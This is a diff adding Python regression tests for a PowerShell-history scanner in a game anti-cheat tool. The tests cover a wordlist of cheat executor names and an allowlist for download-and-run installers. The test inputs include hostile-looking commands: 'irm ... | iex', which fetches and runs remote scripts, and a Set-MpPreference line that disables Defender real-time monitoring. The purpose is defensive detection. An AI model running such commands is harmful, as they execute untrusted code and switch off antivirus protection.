@@ -173,6 +173,87 @@ def test_powershell_search_pattern_helper():
         "kdmapper; Where-Object -match 'algo'", "kdmapper") is False
 
 
+# ===== FP: lista de assinatura (script anti-cheat / o próprio Telador) =====
+
+def test_signature_list_assignment_not_flagged():
+    """REGRESSÃO FP: `$cheat = 'solara|xeno|...'` é a WORDLIST de um script de
+    screenshare/anti-cheat (ou do próprio Telador) caindo no PS history — não
+    é cheat rodando. Sem verbo de busca, o _is_search_pattern não pegava."""
+    import command_history as ch
+    line = ("$cheat = 'solara|xeno|wave|krnl|fluxus|velocity|ronix|synapse|"
+            "swift|celery|hydrogen|delta|arceus|codex|seliware|comet|trigon|"
+            "awp|macsploit|exploit|injector|executor|loader|bootstrap'")
+    kw, sev = ch._match_in_line(line)
+    assert kw is None, f"FP: lista de assinatura casou '{kw}' ({sev})"
+
+
+def test_signature_list_helper():
+    """Núcleo: precisa de '|' E de vários executores DISTINTOS (que casem bare)."""
+    import command_history as ch
+    assert ch._is_signature_list("'solara|krnl|fluxus'") is True
+    # Um executor só, mesmo com pipe (pipeline real), NÃO é lista
+    assert ch._is_signature_list("krnl | tee log.txt") is False
+    # Sem pipe nenhum, não é lista
+    assert ch._is_signature_list("run solara.exe") is False
+
+
+def test_single_executor_still_flagged_despite_pipe():
+    """Não pode regredir: rodar UM executor com pipe continua detectado."""
+    import command_history as ch
+    assert ch._match_in_line("solara.exe | tee log.txt")[0] is not None
+    assert ch._match_in_line(".\\krnl.exe")[0] is not None
+
+
+# ===== FP: download+exec de domínio CONFIÁVEL (allowlist) =====
+# TRUSTED_DOMAINS nasce VAZIO (só popula de trusted_domains.json local), então
+# os testes injetam um domínio sintético e limpam depois — herméticos, não
+# dependem do arquivo local existir.
+
+_TRUSTED_TEST_DOMAIN = "allowlisted.test"
+
+
+def _with_trusted(fn):
+    """Roda fn() com _TRUSTED_TEST_DOMAIN na allowlist e limpa no fim."""
+    import database
+    database.TRUSTED_DOMAINS.add(_TRUSTED_TEST_DOMAIN)
+    try:
+        fn()
+    finally:
+        database.TRUSTED_DOMAINS.discard(_TRUSTED_TEST_DOMAIN)
+
+
+def test_trusted_domain_irm_iex_not_flagged():
+    """REGRESSÃO FP: `irm "https://<confiável>/..." | iex` é instalador legítimo
+    do dono (steamtools). irm/iex são HIGH sozinhos, mas vindo de domínio
+    confiável não é flag."""
+    import command_history as ch
+    def check():
+        assert ch._match_in_line(
+            f'irm "https://{_TRUSTED_TEST_DOMAIN}/install-plugin.ps1" | iex')[0] is None
+        assert ch._match_in_line(
+            f'iex (irm https://{_TRUSTED_TEST_DOMAIN}/install-plugin-legacy.ps1)')[0] is None
+    _with_trusted(check)
+
+
+def test_trusted_domain_does_not_clear_independent_redflag():
+    """Domínio confiável só limpa download/exec — red flag INDEPENDENTE (bypass
+    de Defender) na mesma linha continua acendendo."""
+    import command_history as ch
+    def check():
+        kw, sev = ch._match_in_line(
+            f'irm https://{_TRUSTED_TEST_DOMAIN}/x | iex; '
+            'Set-MpPreference -DisableRealtimeMonitoring $true')
+        assert kw is not None and sev == "high"
+    _with_trusted(check)
+
+
+def test_untrusted_domain_irm_iex_still_flagged():
+    """Não pode regredir: irm|iex de domínio qualquer (não-allowlist) continua HIGH."""
+    import command_history as ch
+    kw, sev = ch._match_in_line('irm "https://rando.example/x.ps1" | iex')
+    assert kw is not None and sev == "high"
+
+
 # ===== FP v3.38.1: bare folder names colidindo com software legítimo =====
 
 def test_generic_folder_names_dont_match():
